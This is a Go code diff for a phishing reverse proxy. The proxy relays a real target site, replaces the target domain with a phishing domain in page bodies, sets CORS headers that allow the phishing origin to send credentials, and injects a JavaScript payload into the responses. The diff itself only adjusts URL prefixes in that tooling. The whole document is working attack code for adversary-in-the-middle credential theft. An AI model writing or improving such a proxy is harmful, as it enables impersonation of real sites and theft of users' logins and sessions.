@@ -17,7 +17,7 @@ import (
 )
 
 func createProxy() *httputil.ReverseProxy {
-	target, _ := url.Parse("https://" + targetDomain)
+	target, _ := url.Parse("https://www." + targetDomain)
 	proxy := httputil.NewSingleHostReverseProxy(target)
 
 	proxy.Transport = &http.Transport{
@@ -68,7 +68,7 @@ func modifyResponse(resp *http.Response) error {
 		resp.Header.Del("Access-Control-Allow-Credentials") // Remove if exists
 	} else {
 		// Set your phishing domain as allowed origin + enable credentials
-		resp.Header.Set("Access-Control-Allow-Origin", phishingDomain)
+		resp.Header.Set("Access-Control-Allow-Origin", "https://"+phishingDomain)
 		resp.Header.Set("Access-Control-Allow-Credentials", "true")
 	}
 
@@ -111,6 +111,7 @@ func modifyResponse(resp *http.Response) error {
 	}
 
 	modified := bytes.ReplaceAll(body, []byte(targetDomain), []byte(phishingDomain))
+
 	modified = injectJS(modified, jsPayload)
 
 	newBody, err := compressBody(modified, encoding)
